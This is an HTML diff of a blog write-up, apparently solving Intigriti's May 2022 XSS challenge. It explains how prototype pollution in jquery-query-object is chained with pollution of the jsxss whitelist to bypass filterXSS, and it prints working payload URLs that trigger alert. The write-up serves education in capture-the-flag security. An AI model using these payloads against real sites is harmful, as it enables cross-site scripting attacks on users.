@@ -214,11 +214,11 @@ Built with <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.c
   
   <div class="post">
     <hr>
-<h2 id="the-challenge">The challenge</h2>
+<h2 id="-the-challenge">/ The challenge</h2>
 <blockquote class="twitter-tweet"><p lang="en" dir="ltr">⏰ It&#39;s CHALLENGE O&#39;CLOCK!<br>👉 Find the XSS before Friday June 3th!<br>👉 Win €300 in SWAG prizes!<br>👉 We&#39;ll release a tip for every 100 likes on this tweet!<br>Thanks <a href="https://twitter.com/PiyushThePal?ref_src=twsrc%5Etfw">@PiyushThePal</a> for the challenge! 👇<a href="https://t.co/X0nq805bVE">https://t.co/X0nq805bVE</a></p>&mdash; INTIGRITI (@intigriti) <a href="https://twitter.com/intigriti/status/1530109003153526784?ref_src=twsrc%5Etfw">May 27, 2022</a></blockquote>
 <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
 
-<h2 id="first-contact">First contact</h2>
+<h2 id="-first-contact">/ First contact</h2>
 <figure>
     <img src="/img/intigriti-0522/home.png"/> 
 </figure>
@@ -238,7 +238,7 @@ Built with <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.c
   } <span style="color:#66d9ef">else</span> {
     document.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">search</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;?page=1&#34;</span>
   }
-</code></pre></div><h2 id="analysis">Analysis</h2>
+</code></pre></div><h2 id="-analysis">/ Analysis</h2>
 <p>An element of the DOM have its <code>innerHTML</code> attribute set to a dynamically retrieved value from the hardcoded <code>pages</code> associative array, based on a key that we can control through the <code>page</code> query parameter.</p>
 <p>If the key exists and a value is retrieved from the array, it is sanitized using the <code>filterXSS</code> method from <a href="https://jsxss.com/en/index.html">jsxss</a> before being injected into the DOM.</p>
 <p>So, if we could somehow:</p>
@@ -247,7 +247,7 @@ Built with <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.c
 <li>Bypass the sanitizing applied on the injected value</li>
 </ol>
 <p>➡ Then we would have <strong>reflected XSS</strong> !</p>
-<h2 id="part-1-the-injection">Part 1: the injection</h2>
+<h2 id="-part-0x1-the-injection">/ Part 0x1: the injection</h2>
 <p>After some digging and having not that much of custom code to play with, my attention turned to the javascript library being used.</p>
 <p>The loaded <code>jquery-query-object@2.2.3</code> seems to be <a href="https://snyk.io/vuln/npm:jquery-query-object@2.2.3">known vulnerable</a> to a <a href="https://security.snyk.io/vuln/SNYK-JS-JQUERYQUERYOBJECT-1255650">client-side prototype pollution</a>.</p>
 <p>A simple test confirms it:</p>
@@ -268,7 +268,7 @@ Built with <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.c
 </figure>
 
 <p>At this point we can inject arbitrary HTML/JS code but still not achieve XSS due to the sanitizing.</p>
-<h2 id="part-2-the-bypass">Part 2: the bypass</h2>
+<h2 id="-part-0x2-the-bypass">/ Part 0x2: the bypass</h2>
 <p>Having only to bypass the <code>filterXSS</code> now, a quick search on the Internet can lead to one of the great <a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">PortSwigger cheatsheet</a>:</p>
 <figure>
     <img src="/img/intigriti-0522/bypass.png"/> 
@@ -278,7 +278,7 @@ Built with <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.c
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">?__proto__[whiteList][img][]=onerror<span style="color:#960050;background-color:#1e0010">&amp;</span>__proto__[whiteList][img][]=src
 // Allowing payload like: &lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#e6db74">alert(1)</span> /&gt;
 </code></pre></div><p>And we should be done!</p>
-<h2 id="wrapping-up-">Wrapping up 🚩</h2>
+<h2 id="-wrapping-up-">/ Wrapping up 🚩</h2>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">https://challenge-0522.intigriti.io/challenge/challenge.html?__proto__[whiteList][img][]=onerror<span style="color:#960050;background-color:#1e0010">&amp;</span>__proto__[whiteList][img][]=src<span style="color:#960050;background-color:#1e0010">&amp;</span>__proto__[erk3]=&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span> <span style="color:#a6e22e">onerror</span><span style="color:#960050;background-color:#1e0010">%</span><span style="color:#a6e22e">3Dalert</span><span style="color:#960050;background-color:#1e0010">(</span><span style="color:#a6e22e">document</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#a6e22e">domain</span><span style="color:#960050;background-color:#1e0010">)</span>&gt;<span style="color:#960050;background-color:#1e0010">&amp;</span>page=erk3
 </code></pre></div><figure>
     <img src="/img/intigriti-0522/flag.png"/> 
